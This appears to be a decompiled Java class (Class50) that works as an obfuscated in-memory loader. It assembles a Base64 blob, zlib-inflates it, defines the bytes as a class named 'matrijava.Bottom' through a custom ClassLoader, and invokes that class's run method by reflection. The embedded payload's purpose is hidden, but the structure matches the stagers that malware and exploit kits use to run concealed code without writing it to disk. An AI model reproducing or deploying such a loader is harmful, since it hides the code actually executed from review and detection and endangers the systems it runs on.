import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.zip.InflaterInputStream;
import javax.xml.bind.DatatypeConverter;
import matrijava.Class50;

public class Class50 extends ClassLoader {
  public Class50(ClassLoader paramClassLoader) {
    super(paramClassLoader);
  }
  
  public Class<?> loadClass(String paramString, byte[] paramArrayOfbyte) throws ClassNotFoundException {
    return defineClass(paramString, paramArrayOfbyte, 0, paramArrayOfbyte.length);
  }
  
  public static void run() throws Exception {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("eNptUutOE1EQ/k5Le7bb5SIVBOTqtQWlaqEViqAQSYxVCRi5/GlOu6dlod2t212VGH0Pn8Df8AMSSXwA30njnC0KKJvsnJlvZr/5zuz8+PXtO4ApPNbRhSGOYY6RGEYxpiOMazpCuK7CGxpu6riF2wpJakjpGMeEhjsa7nJMcqQZonOWbXnz");
    stringBuilder.append("DOFk6g1D25JjSobOgmXLl369JN3XolQjJOz6NkP7mifKuy9EI0CDxvcY9KcfyrLhWY7d5LhP8Zrju2W5bKkP44uO5zn1yR3xThi4hG6GXuWnLSe96Fcq0pXmqhSmdBn6/ySe2Q3fW/NcKeqtHMcDAxlMKYZpZbIGcnhIvVZEs/necc3ZUY4Z");
    stringBuilder.append("A7PIG5jDI4bB9Y3phl/PbS5n11eXdzeyi5WtmYz/ZLews5Qj3QbmscAwVqmJ6kerWHb8mlk0naLlFUt7xW1hm2S2xSedxrHuOnZ1tHHSipCuuvBcK5Dbuh9BQVQTdjX9qrQjy945iC5j2VWGxCn0d2rnC/eaniS6kEV4T+GCieQZ+pIXJtQf");
    stringBuilder.append("TJymWqML0LDje2fpVkjNKV3iApiBN1RUUzJOOM/cJGDVqNBUq8JwOZn6v4bWS771Ra35D0VrPvnUFsbQSSusnhCY2g6yCYqG6GR0RsaPwPbJoQ5kowEYRQw9VBoKSj8jQh4wd4zQ5jHCmwdoO0LkCNHnB+Dd2iFi44fQC93xiUMYX9Ch0HZC");
    stringBuilder.append("vyKu3A5y9wMBqsMwOFmN2GMYgI4RxJGE2r0O5ElqL2UNhH4iw3GFo4+jn5A20jVA79WAZ/A33cTWiw==");
    run("matrijava.Bottom", stringBuilder.toString());
  }
  
  public static void pipe(InputStream paramInputStream, OutputStream paramOutputStream) throws Exception {
    byte[] arrayOfByte = new byte[1024];
    int i;
    while ((i = paramInputStream.read(arrayOfByte)) > 0)
      paramOutputStream.write(arrayOfByte, 0, i); 
  }
  
  public static byte[] unzip(byte[] paramArrayOfbyte) throws Exception {
    InflaterInputStream inflaterInputStream = new InflaterInputStream(new ByteArrayInputStream(paramArrayOfbyte));
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    pipe(inflaterInputStream, byteArrayOutputStream);
    return byteArrayOutputStream.toByteArray();
  }
  
  public static void run(String paramString1, String paramString2) throws Exception {
    byte[] arrayOfByte = unzip(DatatypeConverter.parseBase64Binary(paramString2));
    Class50 class50 = new Class50(ClassLoader.getSystemClassLoader());
    Class<?> clazz = class50.loadClass(paramString1, arrayOfByte);
    clazz.getMethod("run", new Class[0]).invoke(null, new Object[0]);
  }
}
